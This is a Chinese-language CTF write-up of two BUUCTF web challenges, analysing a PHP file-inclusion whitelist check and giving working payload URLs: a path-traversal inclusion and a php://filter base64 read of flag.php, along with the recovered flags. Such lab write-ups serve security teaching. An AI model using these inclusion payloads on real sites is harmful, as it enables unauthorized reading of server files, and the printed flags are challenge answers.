# 1. Buuctf web Warm UP



​	发现，除了一个笑脸什么都没有了，查看源码发现提示 `source.php`，输入后得到php代码。

```php
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

​	代码分为一个emmm类，中含有checkFile函数和主运行代码，大致浏览以下代码，发现 `hint.php` 的提示，输入后得到提示： ==flag not here, and flag in ffffllllaaaagggg== 得到线索，flag可能在ffffllllaaaagggg文件中。

​	现在我们先跳过checkFile函数，直接看调用代码。

```php
if (! empty($_REQUEST['file'])		//接收一个file参数
        && is_string($_REQUEST['file'])		//file类型为字符串
        && emmm::checkFile($_REQUEST['file'])		//checkFile函数返回true
    ) {
        include $_REQUEST['file'];		//包含一个文件，文件来自 $_REQUEST['file']
        exit;
    } else {		//如果判断条件不通过，返回滑稽表情包
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
```

​	分析完调用代码，我们来看 `checkFile` 函数，如何让其返回true值。

```php
public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];		//用户白名单
            if (! isset($page) || !is_string($page)) {		//如果file为空，或者file不是字符串，判断为true
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {		//如果file在白名单中，返回true
                return true;
            }

            $_page = mb_substr(		//substr(string,start,length) 返回字符串的一部分
                $page,
                0,
                mb_strpos($page . '?', '?')		
                //strpos(string,find,start) 查找find在string中第一次出现的位置  -start规定开始查询的位置（可选）
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);		//对url进行反编码--及将对应字符的url code翻译为字符
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
```

​	通过分析代码，我们尝试构造payload，多次尝试最终`http://503a8ecc-7018-4c4c-bbbc-5c804b773283.node5.buuoj.cn:81/source.php/?file=hint.php?../../../../../../../ffffllllaaaagggg` 得到flag ` ` `flag{02851256-70ea-40b6-a6f3-db1827143207}`





# 2. Buuctf web Include



​	跟据题目提示 `include` 猜测使用文件包含漏洞。

​	打开题目，映入眼帘的是 `tips` 点击，提示 `Can you find out the flag?` 

尝试php伪协议，

[php伪协议]: https://www.cnblogs.com/zzjdbk/p/13030717.html	"详细讲解php伪协议。"

直接构造payload `http://d6ae6141-3682-4ea7-aba7-324fad037e23.node5.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php`

得到php代码经过base64加密后的值

`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZmVjOGUyZWUtODhiYy00MzFlLWFmYjItNzgyMzcwM2IyNzVlfQo=` 

base64解码后得到php源码，发现flag。

```php
<?php
echo "Can you find out the flag?";
//flag{fec8e2ee-88bc-431e-afb2-7823703b275e}
```

















